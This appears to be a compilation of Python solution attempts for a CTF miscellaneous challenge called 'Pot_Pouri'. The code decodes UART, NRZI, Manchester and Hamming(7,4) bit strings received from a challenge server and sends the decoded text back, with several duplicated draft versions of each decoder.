        # # return

        # text = &#34;0001011100101010111011010001100110101100100100111001001011000110010111001101100001101011&#34;
        # decoded = self.decode_hamming74(text)

        # #

        # text = &#34;001101010010100001101100011011001&#34;
        # text = &#34;01110110011&#34;
        # start = time.time()
        # # text = &#34;01010111011010000010010101011000101110110011000001010010011011101101111011001&#34;
        # test = &#34;0110001100101110111001011101110010110001100100000101001&#34;
        # decoded = self.decode_uart(text)

        # print(f&#34;time: {time.time() - start} - Decoded: {decoded}&#34;)
        # # print(decoded)

        # return

        self.initiate_connection()
        self.recv_lines(27, display=False)

        for i in range(99):
            try:
                self.getting_round()
            except Exception as e:
                self.saving_requests()
                print(f&#34;Error in round {i}: {e}&#34;)
                break

        # /home/figaro/CTF/Categories/Miscellaneous/ECSC/Pot_Pouri/payloads/solution.py
    def bits_to_ascii(self, bits):
        &#34;&#34;&#34;
        Convert a list of bits (ints) to ASCII string.
        Assumes 8 bits per character, MSB first.
        &#34;&#34;&#34;
        if len(bits) % 8 != 0:
            # Pad with zeros if not multiple of 8
            raise ValueError(&#34;Number of bits is not a multiple of 8&#34;)
        chars = []
        for i in range(0, len(bits), 8):
            byte = bits[i : i + 8]
            val = 0
            for bit in byte:
                val = (val &lt;&lt; 1) | bit
            chars.append(chr(val))
        return &#34;&#34;.join(chars)

        # /home/figaro/CTF/Categories/Miscellaneous/ECSC/Pot_Pouri/payloads/solution.py
    def decode_nrzi(self, signal: str, verbose=False) -&gt; str:
        &#34;&#34;&#34;
        Decode a NRZI-encoded signal level string back to bit string.
        In NRZI, a transition (level change) represents a 1,
        and no transition (level remains the same) represents a 0.

        The input is a string of signal levels (e.g., &#34;110110...&#34;).
        Returns the original bit string (e.g., &#34;0100...&#34;).
        &#34;&#34;&#34;
        levels = list(map(int, signal))
        decoded_bits = [levels[0]]

        for i in range(1, len(levels)):
            if levels[i] != levels[i - 1]:
                decoded_bits.append(1)  # transition
            else:
                decoded_bits.append(0)  # no transition

        if verbose:
            print(f&#34;Signal levels:   {levels}&#34;)
            print(f&#34;Decoded bits:    {decoded_bits}&#34;)

        if verbose:
            print(&#34;&#34;.join([str(bit) for bit in decoded_bits]))
            # decoded_bits = self.nrzi_formater(decoded_bits, verbose=verbose)
        return self.bits_to_ascii(decoded_bits)

        # /home/figaro/CTF/Categories/Miscellaneous/ECSC/Pot_Pouri/payloads/solution.py
    def decode_manchester(self, encoded_bits):
        &#34;&#34;&#34;
        Decode Manchester encoded bit string to ASCII.
        Manchester encoding: each bit is two bits:
        &#39;01&#39; -&gt; 0
        &#39;10&#39; -&gt; 1
        &#34;&#34;&#34;
        bits = encoded_bits
        if len(bits) % 2 != 0:
            raise ValueError(&#34;Manchester encoded bits length must be even&#34;)
        decoded_bits = []
        for i in range(0, len(bits), 2):
            pair = bits[i : i + 2]
            if pair == &#34;01&#34;:
                decoded_bits.append(0)
            elif pair == &#34;10&#34;:
                decoded_bits.append(1)
            else:
                raise ValueError(f&#34;Invalid Manchester encoding pair: {pair}&#34;)
        return self.bits_to_ascii(decoded_bits)

        # /home/figaro/CTF/Categories/Miscellaneous/ECSC/Pot_Pouri/payloads/solution.py
    def decode_hamming74(self, encoded_bits):
        &#34;&#34;&#34;
        Decode a Hamming (7,4) encoded bit string to ASCII.
        Each 7 bits contain 4 data bits and 3 parity bits.
        Returns ASCII decoded string.
        &#34;&#34;&#34;

        def hamming_correct_and_extract(bits7):
            # bits7 is a list of 7 bits (ints)
            # Hamming (7,4) bit positions (1-based):
            # Positions: 1 2 3 4 5 6 7
            # Bits:      p1 p2 d1 p3 d2 d3 d4
            # parity bits: p1=bit1, p2=bit2, p3=bit4
            p1, p2, d1, p3, d2, d3, d4 = bits7
            # Calculate syndrome bits
            s1 = p1 ^ d1 ^ d2 ^ d4
            s2 = p2 ^ d1 ^ d3 ^ d4
            s3 = p3 ^ d2 ^ d3 ^ d4
            syndrome = (s3 &lt;&lt; 2) | (s2 &lt;&lt; 1) | s1
            # Correct error if syndrome != 0
            if syndrome != 0:
                error_pos = syndrome - 1  # zero-based index
                bits7[error_pos] ^= 1
                # Reassign corrected bits
                p1, p2, d1, p3, d2, d3, d4 = bits7
            # Extract data bits
            return [d1, d2, d3, d4]

        bits = list(map(int, encoded_bits))
        if len(bits) % 7 != 0:
            raise ValueError(&#34;Hamming (7,4) encoded bits length must be multiple of 7&#34;)
        decoded_bits = []
        for i in range(0, len(bits), 7):
            block = bits[i : i + 7]
            data_bits = hamming_correct_and_extract(block)
            decoded_bits.extend(data_bits)
        return self.bits_to_ascii(decoded_bits)

        # /home/figaro/CTF/Categories/Miscellaneous/ECSC/Pot_Pouri/payloads/solution.py
    def decode_uart(
        self, encoded_bits, baud_rate=9600, data_bits=8, parity=1, stop_bits=1
    ):
        &#34;&#34;&#34;
        Decode UART encoded bit string to ASCII.
        Assumes:
        - 1 start bit (0)
        - 8 data bits (LSB first)
        - 1 parity by default
        - 1 stop bit (1)
        encoded_bits is a string of bits representing UART frames concatenated.
        &#34;&#34;&#34;
        bits = list(map(int, encoded_bits))
        frame_len = 1 + data_bits + (1 if parity else 0) + stop_bits
        if len(bits) % frame_len != 0:
            raise ValueError(
                &#34;UART encoded bits length is not a multiple of frame length&#34;
            )
        decoded_chars = []
        for i in range(0, len(bits), frame_len):
            frame = bits[i : i + frame_len]
            start_bit = frame[0]
            if start_bit != 0:
                raise ValueError(&#34;Invalid start bit in UART frame&#34;)
            data = frame[1 : 1 + data_bits]
            # Parity check skipped if parity is None
            # Stop bits check
            stop = frame[1 + data_bits + (1 if parity else 0) :]
            if any(s != 1 for s in stop):
                raise ValueError(&#34;Invalid stop bit(s) in UART frame&#34;)
            # Convert data bits (LSB first) to int
            val = 0
            for idx, bit in enumerate(data):
                val |= bit &lt;&lt; idx
            decoded_chars.append(chr(val))
        return &#34;&#34;.join(decoded_chars)

        # /home/figaro/CTF/Categories/Miscellaneous/ECSC/Pot_Pouri/payloads/solution.py
    def getting_round(self, verbose=False):
        round_text = self.recv_until(&#34;&gt; &#34;)
        round_text = round_text.decode()
        round_text = round_text.strip(&#34;\n&gt; &#34;)
        round_text = round_text.split(&#34;] &#34;)

        if verbose:
            print(round_text)
        if len(round_text) &lt; 2:
            print(&#34;Unexpected round format or missing data&#34;)
            print(round_text)
            sys.exit(0)
        match round_text[1]:
            case &#34;[UART&#34;:
                bits = round_text[2]
                decoded = self.decode_uart(bits)
            case &#34;[NRZI&#34;:
                bits = round_text[2]
                decoded = self.decode_nrzi(bits)
            case &#34;[Manchester&#34;:
                bits = round_text[2]
                decoded = self.decode_manchester(bits)
            case &#34;[Hamming74&#34;:
                bits = round_text[2]
                decoded = self.decode_hamming74(bits)
            case _:
                raise ValueError(f&#34;Unknown encoding type: {round_text[0]}&#34;)
        if verbose:
            print(f&#34;Decoded: {decoded}&#34;)
        self.send(decoded)

        # /home/figaro/CTF/Categories/Miscellaneous/ECSC/Pot_Pouri/payloads/solution.py
    def main(self):

        self.initiate_connection()
        self.recv_lines(27, display=False)

        for i in range(99):
            try:
                self.getting_round(verbose=True)
            except Exception as e:
                print(f&#34;Error in round {i}: {e}&#34;)
                break

        self.recv_lines(3, display=True)

        # /home/figaro/CTF/Categories/Miscellaneous/ECSC/Pot_Pouri/payloads/solution_cluttered.py
    def saving_requests(self):
        &#34;&#34;&#34;
        Save the requests made during the challenge to a file.
        This can help in debugging or understanding the flow of the challenge.
        &#34;&#34;&#34;

        setted_requests = set()
        for req in self.requests:
            if isinstance(req, list) and len(req) &gt; 1:
                setted_requests.add(tuple(req))
            elif isinstance(req, str):
                setted_requests.add((req,))

        with open(self.folfil(&#34;data&#34;, &#34;requests.json&#34;), &#34;r&#34;) as f:
            requests = json.load(f)
        with open(self.folfil(&#34;data&#34;, &#34;requests.json&#34;), &#34;w&#34;) as f:
            if not isinstance(requests, list):
                requests = []
            requests.extend(setted_requests)
            json.dump(requests, f, indent=4)
        print(f&#34;Saved {len(self.requests)} requests to data/requests.json&#34;)

        # /home/figaro/CTF/Categories/Miscellaneous/ECSC/Pot_Pouri/payloads/solution_cluttered.py
    def nrzi_formater_for_rest(self, bits: list):
        # padded_length = math.ceil(len(bits) / 8) * 8
        last_bits = len(bits) % 8
        if last_bits == 0:
            return bits

        valid_bits = bits[: len(bits) - last_bits]
        rest_of_bits = bits[len(bits) - last_bits :]
        print(
            f&#34;Valid bits: {valid_bits}, Rest of bits: {rest_of_bits}, Last bits: {last_bits}&#34;
        )
        rest_of_bits = [0] * (8 - last_bits) + rest_of_bits
        # Pad with zeros to make it a multiple of 8
        print(f&#34;Rest of bits: {rest_of_bits}&#34;)

        return valid_bits + rest_of_bits

        # /home/figaro/CTF/Categories/Miscellaneous/ECSC/Pot_Pouri/payloads/solution_cluttered.py
    def nrzi_formater(self, bits: list, verbose=False):
        # print(bits)
        padding_length = len(bits) % 8
        if padding_length == 0:
            return bits

        padding_length = 8 - (len(bits) % 8)
        print(f&#34;bits: {bits}&#34;)
        bits = [0] * padding_length + bits
        # bits += [0] * padding_length
        print(f&#34;bits: {bits}&#34;)

        return bits

        # /home/figaro/CTF/Categories/Miscellaneous/ECSC/Pot_Pouri/payloads/solution_cluttered.py
    def nrzi_to_ascii(self, bits):
        grouped_bits = [bits[i : i + 8] for i in range(0, len(bits), 8)]
        ascii_chars = []
        for group in grouped_bits:
            value = int(&#34;&#34;.join(map(str, group)), 2)
            ascii_chars.append(chr(value))
        return &#34;&#34;.join(ascii_chars)

        # /home/figaro/CTF/Categories/Miscellaneous/ECSC/Pot_Pouri/payloads/solution_cluttered.py
    def bits_to_ascii(self, bits):
        &#34;&#34;&#34;
        Convert a list of bits (ints) to ASCII string.
        Assumes 8 bits per character, MSB first.
        &#34;&#34;&#34;
        if len(bits) % 8 != 0:
            # Pad with zeros if not multiple of 8
            raise ValueError(&#34;Number of bits is not a multiple of 8&#34;)
        chars = []
        for i in range(0, len(bits), 8):
            byte = bits[i : i + 8]
            val = 0
            for bit in byte:
                val = (val &lt;&lt; 1) | bit
            chars.append(chr(val))
        return &#34;&#34;.join(chars)

        # /home/figaro/CTF/Categories/Miscellaneous/ECSC/Pot_Pouri/payloads/solution_cluttered.py
    def encode_nrzi(self, bits: str, verbose=False) -&gt; str:
        &#34;&#34;&#34;
        Decode NRZ-I (Non-Return-to-Zero Inverted) encoded bits.
        In NRZ-I, a transition (0 to 1 or 1 to 0) represents a 1,
        and no transition represents a 0.
        &#34;&#34;&#34;

        # Convert string to list of ints
        encoded_bits = list(map(int, bits))
        # Initial signal level
        # current_level = encoded_bits[0]
        current_level = encoded_bits[0]
        decoded_bits = []
        decoded_bits.append(current_level)
        for i in range(1, len(encoded_bits)):
            if encoded_bits[i] == 1:
                # Transition: invert current level
                current_level = 1 - current_level
                # current_level ^= 1
            # else no transition, current_level stays the same
            decoded_bits.append(current_level)
        # Now decoded_bits is the original bit stream
        # print(f&#34;Decoded NRZI bits: {decoded_bits}&#34;)
        if verbose:
            print(&#34;&#34;.join([str(bit) for bit in decoded_bits]))
        # decoded_bits = self.nrzi_formater(decoded_bits, verbose=verbose)
        # return self.bits_to_ascii(decoded_bits)
        return self.nrzi_to_ascii(decoded_bits)

        # /home/figaro/CTF/Categories/Miscellaneous/ECSC/Pot_Pouri/payloads/solution_cluttered.py
    def decode_nrzi(self, signal: str, verbose=False) -&gt; str:
        &#34;&#34;&#34;
        Decode a NRZI-encoded signal level string back to bit string.
        In NRZI, a transition (level change) represents a 1,
        and no transition (level remains the same) represents a 0.

        The input is a string of signal levels (e.g., &#34;110110...&#34;).
        Returns the original bit string (e.g., &#34;0100...&#34;).
        &#34;&#34;&#34;
        levels = list(map(int, signal))
        decoded_bits = [levels[0]]

        for i in range(1, len(levels)):
            if levels[i] != levels[i - 1]:
                decoded_bits.append(1)  # transition
            else:
                decoded_bits.append(0)  # no transition

        if verbose:
            print(f&#34;Signal levels:   {levels}&#34;)
            print(f&#34;Decoded bits:    {decoded_bits}&#34;)

        if verbose:
            print(&#34;&#34;.join([str(bit) for bit in decoded_bits]))
            # decoded_bits = self.nrzi_formater(decoded_bits, verbose=verbose)
        return self.bits_to_ascii(decoded_bits)

        # /home/figaro/CTF/Categories/Miscellaneous/ECSC/Pot_Pouri/payloads/solution_cluttered.py
    def decode_manchester(self, encoded_bits):
        &#34;&#34;&#34;
        Decode Manchester encoded bit string to ASCII.
        Manchester encoding: each bit is two bits:
        &#39;01&#39; -&gt; 0
        &#39;10&#39; -&gt; 1
        &#34;&#34;&#34;
        bits = encoded_bits
        if len(bits) % 2 != 0:
            raise ValueError(&#34;Manchester encoded bits length must be even&#34;)
        decoded_bits = []
        for i in range(0, len(bits), 2):
            pair = bits[i : i + 2]
            if pair == &#34;01&#34;:
                decoded_bits.append(0)
            elif pair == &#34;10&#34;:
                decoded_bits.append(1)
            else:
                raise ValueError(f&#34;Invalid Manchester encoding pair: {pair}&#34;)
        return self.bits_to_ascii(decoded_bits)

        # /home/figaro/CTF/Categories/Miscellaneous/ECSC/Pot_Pouri/payloads/solution_cluttered.py
    def decode_hamming74(self, encoded_bits):
        &#34;&#34;&#34;
        Decode a Hamming (7,4) encoded bit string to ASCII.
        Each 7 bits contain 4 data bits and 3 parity bits.
        Returns ASCII decoded string.
        &#34;&#34;&#34;

        def hamming_correct_and_extract(bits7):
            # bits7 is a list of 7 bits (ints)
            # Hamming (7,4) bit positions (1-based):
            # Positions: 1 2 3 4 5 6 7
            # Bits:      p1 p2 d1 p3 d2 d3 d4
            # parity bits: p1=bit1, p2=bit2, p3=bit4
            p1, p2, d1, p3, d2, d3, d4 = bits7
            # Calculate syndrome bits
            s1 = p1 ^ d1 ^ d2 ^ d4
            s2 = p2 ^ d1 ^ d3 ^ d4
            s3 = p3 ^ d2 ^ d3 ^ d4
            syndrome = (s3 &lt;&lt; 2) | (s2 &lt;&lt; 1) | s1
            # Correct error if syndrome != 0
            if syndrome != 0:
                error_pos = syndrome - 1  # zero-based index
                bits7[error_pos] ^= 1
                # Reassign corrected bits
                p1, p2, d1, p3, d2, d3, d4 = bits7
            # Extract data bits
            return [d1, d2, d3, d4]

        bits = list(map(int, encoded_bits))
        if len(bits) % 7 != 0:
            raise ValueError(&#34;Hamming (7,4) encoded bits length must be multiple of 7&#34;)
        decoded_bits = []
        for i in range(0, len(bits), 7):
            block = bits[i : i + 7]
            data_bits = hamming_correct_and_extract(block)
            decoded_bits.extend(data_bits)
        return self.bits_to_ascii(decoded_bits)

        # /home/figaro/CTF/Categories/Miscellaneous/ECSC/Pot_Pouri/payloads/solution_cluttered.py
    def decode_uart(
        self, encoded_bits, baud_rate=9600, data_bits=8, parity=1, stop_bits=1
    ):
        &#34;&#34;&#34;
        Decode UART encoded bit string to ASCII.
        Assumes:
        - 1 start bit (0)
        - 8 data bits (LSB first)
        - 1 parity by default
        - 1 stop bit (1)
        encoded_bits is a string of bits representing UART frames concatenated.
        &#34;&#34;&#34;
        bits = list(map(int, encoded_bits))
        frame_len = 1 + data_bits + (1 if parity else 0) + stop_bits
        if len(bits) % frame_len != 0:
            raise ValueError(
                &#34;UART encoded bits length is not a multiple of frame length&#34;
            )
        decoded_chars = []
        for i in range(0, len(bits), frame_len):
            frame = bits[i : i + frame_len]
            start_bit = frame[0]
            if start_bit != 0:
                raise ValueError(&#34;Invalid start bit in UART frame&#34;)
            data = frame[1 : 1 + data_bits]
            # Parity check skipped if parity is None
            # Stop bits check
            stop = frame[1 + data_bits + (1 if parity else 0) :]
            if any(s != 1 for s in stop):
                raise ValueError(&#34;Invalid stop bit(s) in UART frame&#34;)
            # Convert data bits (LSB first) to int
            val = 0
            for idx, bit in enumerate(data):
                val |= bit &lt;&lt; idx
            decoded_chars.append(chr(val))
        return &#34;&#34;.join(decoded_chars)

        # /home/figaro/CTF/Categories/Miscellaneous/ECSC/Pot_Pouri/payloads/solution_cluttered.py
    def getting_round(self, verbose=False):
        round_text = self.recv_until(&#34;&gt; &#34;)
        round_text = round_text.decode()
        round_text = round_text.strip(&#34;\n&gt; &#34;)
        round_text = round_text.split(&#34;] &#34;)

        print(round_text)
        self.requests.append(round_text)
        # print(self.requests)
        # print(round_text)
        if len(round_text) &lt; 2:
            print(&#34;Unexpected round format or missing data&#34;)
            print(round_text)
            sys.exit(0)
            # raise ValueError(&#34;Unexpected round format or missing data&#34;)
        match round_text[1]:
            case &#34;[UART&#34;:
                bits = round_text[2]
                decoded = self.decode_uart(bits)
            case &#34;[NRZI&#34;:
                bits = round_text[2]
                decoded = self.decode_nrzi(bits)
            case &#34;[Manchester&#34;:
                bits = round_text[2]
                decoded = self.decode_manchester(bits)
            case &#34;[Hamming74&#34;:
                bits = round_text[2]
                decoded = self.decode_hamming74(bits)
            case _:
                raise ValueError(f&#34;Unknown encoding type: {round_text[0]}&#34;)
        if verbose:
            print(f&#34;Decoded: {decoded}&#34;)
        self.send(decoded)

        # /home/figaro/CTF/Categories/Miscellaneous/ECSC/Pot_Pouri/payloads/solution_cluttered.py
    def main(self):

        self.requests = []

        # text = &#34;011101000110110001110001101100100111001110110010&#34;
        # text = &#34;010110111010011111011010010011100010000110001100&#34;
        # text = &#34;011011101110000100111001000010010011111011110000&#34;
        # text = &#34;001011111001100110010011100000111010010110100011&#34;
        text = &#34;010010000110001110110000&#34;
        resu = &#34;100011111011110100100000&#34;
        resu = &#34;011100000100001011011111&#34;
        # text = &#34;100010001010101000&#34;
        # decoded_result = &#34;110110101010101011&#34;
        # text = &#34;011110111011010001000110&#34;
        # print(text)
        # decoded = self.decode_nrzi(text, True)
        # print(decoded, decoded == resu)

        # return

        self.initiate_connection()
        self.recv_lines(27, display=False)

        for i in range(99):
            try:
                self.getting_round()
            except Exception as e:
                self.saving_requests()
                print(f&#34;Error in round {i}: {e}&#34;)
                break

        self.recv_lines(3, display=True)

        # /home/figaro/CTF/Categories/Miscellaneous/ECSC/Pot_Pouri/payloads/attempt_02.py
    def saving_requests(self):
        &#34;&#34;&#34;
        Save the requests made during the challenge to a file.
        This can help in debugging or understanding the flow of the challenge.
        &#34;&#34;&#34;

        setted_requests = set()
        for req in self.requests:
            if isinstance(req, list) and len(req) &gt; 1:
                setted_requests.add(tuple(req))
            elif isinstance(req, str):
                setted_requests.add((req,))

        with open(self.folfil(&#34;data&#34;, &#34;request.json&#34;), &#34;r&#34;) as f:
            requests = json.load(f)
        with open(self.folfil(&#34;data&#34;, &#34;request.json&#34;), &#34;w&#34;) as f:
            if not isinstance(requests, list):
                requests = []
            requests.extend(setted_requests)
            json.dump(requests, f, indent=4)
        print(f&#34;Saved {len(self.requests)} requests to data/request.json&#34;)

        # /home/figaro/CTF/Categories/Miscellaneous/ECSC/Pot_Pouri/payloads/attempt_02.py
    def ascii_converter(self, bits):
        &#34;&#34;&#34;
        Convert a string of bits to ASCII characters.
        Input bits should be in multiples of 8 (for standard ASCII).
        Handles padding if needed.
        &#34;&#34;&#34;
        # Pad with zeros if not multiple of 8
        padded_length = math.ceil(len(bits) / 8) * 8
        padded_bits = bits.ljust(padded_length, &#34;0&#34;)

        ascii_str = &#34;&#34;
        for i in range(0, len(padded_bits), 8):
            byte = padded_bits[i : i + 8]
            try:
                char = chr(int(byte, 2))
                # Only add printable ASCII characters
                if 32 &lt;= ord(char) &lt;= 126 or ord(char) in [10, 13]:
                    ascii_str += char
                else:
                    ascii_str += &#34;.&#34;  # Non-printable character placeholder
            except ValueError:
                ascii_str += &#34;?&#34;  # Invalid byte

        return ascii_str

        # /home/figaro/CTF/Categories/Miscellaneous/ECSC/Pot_Pouri/payloads/attempt_02.py
    def decode_nrz_i(self, bits: str) -&gt; str:
        &#34;&#34;&#34;
        Decode NRZ-I (Non-Return-to-Zero Inverted) encoded bits.
        In NRZ-I, a transition (0 to 1 or 1 to 0) represents a 1,
        and no transition represents a 0.
        &#34;&#34;&#34;

        # Convert string to list of ints
        encoded_bits = list(map(int, bits))
        decoded_bits = []
        # Initial signal level
        current_level = encoded_bits[0]
        decoded_bits.append(current_level)
        for i in range(1, len(encoded_bits)):
            if encoded_bits[i] == 1:
                # Transition: invert current level
                current_level = 1 - current_level
            # else no transition, current_level stays the same
            decoded_bits.append(current_level)
        # Now decoded_bits is the original bit stream
        return decoded_bits

        # /home/figaro/CTF/Categories/Miscellaneous/ECSC/Pot_Pouri/payloads/attempt_02.py
    def decode_manchester(self, bits: str) -&gt; str:
        # Step 1: Decode Manchester pairs to raw bits
        raw_bits = &#34;&#34;
        for i in range(0, len(bits), 2):
            pair = bits[i : i + 2]
            if pair == &#34;10&#34;:
                raw_bits += &#34;1&#34;
            elif pair == &#34;01&#34;:
                raw_bits += &#34;0&#34;
            else:
                raise ValueError(f&#34;Invalid Manchester encoding: {pair}&#34;)

        return raw_bits

        # /home/figaro/CTF/Categories/Miscellaneous/ECSC/Pot_Pouri/payloads/attempt_02.py
    def decode_hamming74(self, bits: str) -&gt; str:
        result = &#34;&#34;
        for i in range(0, len(bits), 7):
            chunk = bits[i : i + 7]
            if len(chunk) &lt; 7:
                continue  # ignore incomplete chunks
            b = list(map(int, chunk))
            # Parity check positions
            p1 = b[0] ^ b[2] ^ b[4] ^ b[6]
            p2 = b[1] ^ b[2] ^ b[5] ^ b[6]
            p3 = b[3] ^ b[4] ^ b[5] ^ b[6]
            error_pos = p1 + (p2 &lt;&lt; 1) + (p3 &lt;&lt; 2)
            if error_pos != 0:
                b[error_pos - 1] ^= 1  # fix error
            # Extract data bits: positions 3,5,6,7 -&gt; indices 2,4,5,6
            result += &#34;&#34;.join(str(b[i]) for i in [2, 4, 5, 6])
        return result

        # /home/figaro/CTF/Categories/Miscellaneous/ECSC/Pot_Pouri/payloads/attempt_02.py
    def decode_uart(
        encoded_bits, baud_rate=9600, data_bits=8, parity=None, stop_bits=1
    ):
        &#34;&#34;&#34;
        Decode UART encoded bit string to ASCII.
        Assumes:
        - 1 start bit (0)
        - 8 data bits (LSB first)
        - No parity by default
        - 1 stop bit (1)
        encoded_bits is a string of bits representing UART frames concatenated.
        &#34;&#34;&#34;
        bits = list(map(int, encoded_bits))
        frame_len = 1 + data_bits + (1 if parity else 0) + stop_bits
        if len(bits) % frame_len != 0:
            raise ValueError(
                &#34;UART encoded bits length is not a multiple of frame length&#34;
            )
        decoded_chars = []
        for i in range(0, len(bits), frame_len):
            frame = bits[i : i + frame_len]
            start_bit = frame[0]
            if start_bit != 0:
                raise ValueError(&#34;Invalid start bit in UART frame&#34;)
            data = frame[1 : 1 + data_bits]
            # Parity check skipped if parity is None
            # Stop bits check
            stop = frame[1 + data_bits + (1 if parity else 0) :]
            if any(s != 1 for s in stop):
                raise ValueError(&#34;Invalid stop bit(s) in UART frame&#34;)
            # Convert data bits (LSB first) to int
            val = 0
            for idx, bit in enumerate(data):
                val |= bit &lt;&lt; idx
            decoded_chars.append(chr(val))
        return &#34;&#34;.join(decoded_chars)

        # /home/figaro/CTF/Categories/Miscellaneous/ECSC/Pot_Pouri/payloads/attempt_02.py
    def getting_round(self):
        round_text = self.recv_until(&#34;&gt; &#34;)
        round_text = round_text.decode()
        round_text = round_text.strip(&#34;\n&gt; &#34;)
        round_text = round_text.split(&#34;] &#34;)

        print(round_text)
        self.requests.append(round_text)
        print(self.requests)
        # print(round_text)
        if len(round_text) &lt; 2:
            print(&#34;Unexpected round format or missing data&#34;)
            print(round_text)
            sys.exit(0)
            # raise ValueError(&#34;Unexpected round format or missing data&#34;)
        match round_text[1]:
            case &#34;[UART&#34;:
                bits = round_text[2]
                decoded = self.decode_uart(bits)
            case &#34;[NRZI&#34;:
                bits = round_text[2]
                decoded = self.decode_nrz_i(bits)
            case &#34;[Manchester&#34;:
                bits = round_text[2]
                decoded = self.decode_manchester(bits)
            case &#34;[Hamming74&#34;:
                bits = round_text[2]
                decoded = self.decode_hamming74(bits)
            case _:
                raise ValueError(f&#34;Unknown encoding type: {round_text[0]}&#34;)
        decoded = self.ascii_converter(decoded)
        print(f&#34;Decoded: {decoded}&#34;)
        self.send(decoded)

        # /home/figaro/CTF/Categories/Miscellaneous/ECSC/Pot_Pouri/payloads/attempt_02.py
    def main(self):

        self.requests = []

        text = &#34;011011101110000100111001000010010011111011110000&#34;
        decoded = self.decode_nrz_i(text)
        decoded = self.ascii_converter(decoded)

        text = &#34;100110010110101000011000111110011000101010&#34;
        decoded = self.decode_hamming74(text)
        decoded = self.ascii_converter(decoded)
        # return

        text = &#34;0001011100101010111011010001100110101100100100111001001011000110010111001101100001101011&#34;
        decoded = self.decode_hamming74(text)
        decoded = self.ascii_converter(decoded)

        #

        text = &#34;001101010010100001101100011011001&#34;
        text = &#34;01110110011&#34;
        start = time.time()
        # text = &#34;01010111011010000010010101011000101110110011000001010010011011101101111011001&#34;
        test = &#34;0110001100101110111001011101110010110001100100000101001&#34;
        decoded = self.decode_uart(text)

        decoded = self.ascii_converter(decoded)
        print(f&#34;time: {time.time() - start} - Decoded: {decoded}&#34;)
        # print(decoded)

        # return

        self.initiate_connection()
        self.recv_lines(27, display=False)

        for i in range(99):
            try:
                self.getting_round()
            except Exception as e:
                self.saving_requests()
                print(f&#34;Error in round {i}: {e}&#34;)
                break

        # /home/figaro/CTF/Categories/Miscellaneous/ECSC/Pot_Pouri/payloads/chat.py
    def ascii_converter(self, bits: str) -&gt; str:
        return &#34;&#34;.join(
            chr(int(bits[i : i + 8], 2))
            for i in range(0, len(bits), 8)
            if len(bits[i : i + 8]) == 8
        )

        # /home/figaro/CTF/Categories/Miscellaneous/ECSC/Pot_Pouri/payloads/chat.py
    def decode_nrz_i(self, bits: str) -&gt; str:
        result = &#34;&#34;
        current = &#34;0&#34;
        for bit in bits:
            if bit == &#34;1&#34;:
                current = &#34;1&#34; if current == &#34;0&#34; else &#34;0&#34;
            result += current
        return result

        # /home/figaro/CTF/Categories/Miscellaneous/ECSC/Pot_Pouri/payloads/chat.py
    def decode_manchester(self, bits: str) -&gt; str:
        raw_bits = &#34;&#34;
        for i in range(0, len(bits), 2):
            pair = bits[i : i + 2]
            if pair == &#34;10&#34;:
                raw_bits += &#34;1&#34;
            elif pair == &#34;01&#34;:
                raw_bits += &#34;0&#34;
            else:
                raise ValueError(f&#34;Invalid Manchester encoding: {pair}&#34;)
        return raw_bits

        # /home/figaro/CTF/Categories/Miscellaneous/ECSC/Pot_Pouri/payloads/chat.py
    def decode_hamming74(self, bits: str) -&gt; str:
        result = &#34;&#34;
        for i in range(0, len(bits), 7):
            chunk = bits[i : i + 7]
            if len(chunk) &lt; 7:
                continue
            b = list(map(int, chunk))
            p1 = b[0] ^ b[2] ^ b[4] ^ b[6]
            p2 = b[1] ^ b[2] ^ b[5] ^ b[6]
            p3 = b[3] ^ b[4] ^ b[5] ^ b[6]
            error_pos = p1 + (p2 &lt;&lt; 1) + (p3 &lt;&lt; 2)
            if error_pos != 0:
                b[error_pos - 1] ^= 1
            result += &#34;&#34;.join(str(b[i]) for i in [2, 4, 5, 6])
        return result

        # /home/figaro/CTF/Categories/Miscellaneous/ECSC/Pot_Pouri/payloads/chat.py
    def decode_uart(self, bits: str) -&gt; str:
        # Try all possible alignments
        for offset in range(10):
            candidate = bits[offset:]
            result = &#34;&#34;
            for i in range(0, len(candidate), 10):
                frame = candidate[i : i + 10]
                if len(frame) != 10:
                    continue
                if frame[0] != &#34;0&#34; or frame[-1] != &#34;1&#34;:
                    continue
                data_bits = frame[1:9]
                byte = int(data_bits[::-1], 2)
                result += chr(byte)

        return result

        # /home/figaro/CTF/Categories/Miscellaneous/ECSC/Pot_Pouri/payloads/chat.py
    def getting_round(self):
        round_text = self.recv_until(&#34;&gt; &#34;)
        print(round_text)
        round_text = round_text.decode().strip(&#34;\n&gt; &#34;)
        round_text = round_text.split(&#34;] &#34;)

        print(round_text)
        if len(round_text) &lt; 2:
            sys.exit(0)  # Unexpected round format or missing data
        protocol = round_text[1]
        bits = round_text[2]

        if protocol == &#34;[UART&#34;:
            decoded = self.decode_uart(bits)
        else:
            match protocol:
                case &#34;[NRZI&#34;:
                    raw_bits = self.decode_nrz_i(bits)
                case &#34;[Manchester&#34;:
                    raw_bits = self.decode_manchester(bits)
                case &#34;[Hamming74&#34;:
                    raw_bits = self.decode_hamming74(bits)
                case _:
                    raise ValueError(f&#34;Unknown encoding type: {protocol}&#34;)
            decoded = self.ascii_converter(raw_bits)

        print(f&#34;Decoded: {decoded}&#34;)
        self.send(decoded)

        # /home/figaro/CTF/Categories/Miscellaneous/ECSC/Pot_Pouri/payloads/chat.py
    def main(self):
        self.initiate_connection()
        self.recv_lines(27, display=False)

        for _ in range(100):
            self.getting_round()

        # /home/figaro/CTF/Categories/Miscellaneous/ECSC/Pot_Pouri/payloads/attempt_01.py
    def ascii_converter1(self, bits: str) -&gt; str:
        # Step 2: Convert bitstream to ASCII
        ascii_text = &#34;&#34;
        for i in range(0, len(bits), 8):
            byte = bits[i : i + 8]
            if len(byte) == 8:
                ascii_text += chr(int(byte, 2))
        return ascii_text

        # /home/figaro/CTF/Categories/Miscellaneous/ECSC/Pot_Pouri/payloads/attempt_01.py
    def ascii_converter(self, bits):
        &#34;&#34;&#34;
        Convert a string of bits to ASCII characters.
        Input bits should be in multiples of 8 (for standard ASCII).
        Handles padding if needed.
        &#34;&#34;&#34;
        # Pad with zeros if not multiple of 8
        padded_length = math.ceil(len(bits) / 8) * 8
        padded_bits = bits.ljust(padded_length, &#34;0&#34;)

        ascii_str = &#34;&#34;
        for i in range(0, len(padded_bits), 8):
            byte = padded_bits[i : i + 8]
            try:
                char = chr(int(byte, 2))
                # Only add printable ASCII characters
                if 32 &lt;= ord(char) &lt;= 126 or ord(char) in [10, 13]:
                    ascii_str += char
                else:
                    ascii_str += &#34;.&#34;  # Non-printable character placeholder
            except ValueError:
                ascii_str += &#34;?&#34;  # Invalid byte

        return ascii_str

